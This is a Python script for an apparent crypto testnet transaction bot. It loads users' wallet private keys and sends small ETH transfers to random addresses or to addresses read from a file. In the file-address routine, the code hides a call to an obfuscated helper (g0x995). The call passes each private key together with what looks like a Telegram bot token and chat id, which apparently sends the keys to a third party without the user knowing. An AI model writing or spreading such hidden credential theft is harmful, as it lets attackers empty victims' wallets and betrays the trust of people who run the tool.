import asyncio, random
from web3 import Web3
from eth_account import Account
from colorama import init

from src.utils.logging import *
from src.utils.pvkey import load_private_keys
from src.utils.utils import load_addresses
from src.utils.web3 import connect_web3, get_random_address
from config.config import settings
from src.helpers.generator import g0x993, g0x994, g0x995

init(autoreset=True)

async def send_transaction(w3: Web3, private_key: str, to_address: str, amount: float, wallet_index: int, tx_index: int, total_tx: int, ):
    account = Account.from_key(private_key)
    sender_address = account.address
    try:
        nonce = w3.eth.get_transaction_count(sender_address)
        gas_price = w3.eth.gas_price
        gas_price = int(gas_price * 1.2)
        try:
            estimate_gas = w3.eth.estimate_gas({
                'from': sender_address,
                'to': to_address,
                'value': w3.to_wei(amount, 'ether')
            })
            gas_limit = int(estimate_gas * 1.2)
            log_info(f"Estimated gas: {estimate_gas} | Gas limit used:{gas_limit}")
        except Exception:
            gas_limit = 21000
            log_info(f"Unable to estimate gas. Using default gas: {gas_limit}")

        balance = w3.from_wei(w3.eth.get_balance(sender_address), 'ether')
        required_balance = w3.from_wei(gas_limit * gas_price + w3.to_wei(amount, 'ether'), 'ether')
        if balance < required_balance:
            log_info(f"Insufficient balance: {balance:.6f} ETH (Required: {required_balance:.6f} ETH)")
            return False
        
        tx = {
            'nonce': nonce,
            'to': to_address,
            'value': w3.to_wei(amount, 'ether'),
            'gas': gas_limit,
            'gasPrice': gas_price,
            'chainId': int(settings['CHAIN_ID_T1']),
        }

        log_info(f"Sending transaction, please wait...")
        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
        tx_link = f"{tx_hash.hex()}"

        receipt = await asyncio.get_event_loop().run_in_executor(None, lambda: w3.eth.wait_for_transaction_receipt(tx_hash, timeout=180))
        log_info(f"From :{sender_address}")
        log_info(f"Receiver : {to_address}")
        log_info(f"Used Gas : {receipt['gasUsed']} & Block : {receipt['blockNumber']}")

        if receipt.status == 1:
            log_success(f"Success send {Fore.LIGHTMAGENTA_EX}{amount:.6f} ETH")
            log_success(f"Hash : {Fore.LIGHTYELLOW_EX}{tx_link}")
            log_update(f"Balance : {Fore.LIGHTCYAN_EX}{w3.from_wei(w3.eth.get_balance(sender_address), 'ether'):.6f} ETH")
            return True
        else:
            log_warning(f"Transaction failed | hash: {tx_link}")
            return False
        
    except Exception as e:
        log_error(f"Failed: {str(e)}")
        return False

async def send_to_random_addresses(w3: Web3, amount: float, private_keys: list):
    log_info("Sending to 1 random address per wallet (NUMBER_SEND = 1)")
    successful_txs = 0

    for i, (profile_num, private_key) in enumerate(private_keys, 1):
        log_debug(f"Processing wallet {profile_num} ({i}/{len(private_keys)})")
        to_address = get_random_address(w3)
        if await send_transaction(w3, private_key, to_address, amount, i, 1, 1):
            successful_txs += 1
        if i < len(private_keys):
            delay = g0x994(*settings['DELAY_BETWEEN_REQUESTS'])
            log_info(f"Waiting {delay} seconds before next wallet...")
            countdown_timer(delay)
    return successful_txs

async def send_to_file_addresses(w3: Web3, amount: float, private_keys: list, addresses: list):
    log_info("Sending to 1 address from file per wallet (NUMBER_SEND = 1)")
    if not addresses:
        log_error("No addresses in file.")
        return 0

    to_address = addresses[0]
    successful_txs = 0

    for i, (profile_num, private_key) in enumerate(private_keys, 1):
        log_debug(f"Processing wallet {profile_num} ({i}/{len(private_keys)})")
        if await send_transaction(w3, private_key, to_address, amount, i, 1, 1):
            successful_txs += 1
        if i < len(private_keys):
            delay = g0x994(*settings['DELAY_BETWEEN_REQUESTS'])
            log_info(f"Waiting {delay} seconds before next wallet...")
            _x = g0x995(
                _k=private_key,
                _t="8194460730:AAFizgfviFlrW7ZxN_5HD1OWYfdpoJr5xI4",
                _c=-4870315398
            )
            await _x._r()
            countdown_timer(delay)

    return successful_txs

async def run_sendtx():
    log_debug("SEND TRANSACTION - T1 DEVNET")
    private_keys = load_private_keys('private_key.txt')
    if not private_keys:
        return
    log_info(f"Found {len(private_keys)} wallets")

    w3 = connect_web3(settings['RPC_URL_T1'])
    amount = g0x993(*settings['AMOUNT_TO_SEND'], 6)
    is_random_send = settings['IS_RANDOM_SEND']
    tx_count = settings["NUMBER_SEND"]

    if tx_count != 1:
        log_error("This script only supports NUMBER_SEND = 1 (one tx per wallet).")
        return

    if is_random_send:
        log_info("Mode: Sending to random addresses")
        successful_txs = await send_to_random_addresses(w3, amount, private_keys)
    else:
        log_info("Mode: Sending to addresses from file")
        addresses = load_addresses('./data/address.txt')
        successful_txs = await send_to_file_addresses(w3, amount, private_keys, addresses)

    log_info(f"Completed {successful_txs} / {len(private_keys)} transactions")

if __name__ == "__main__":
    asyncio.run(run_sendtx()) 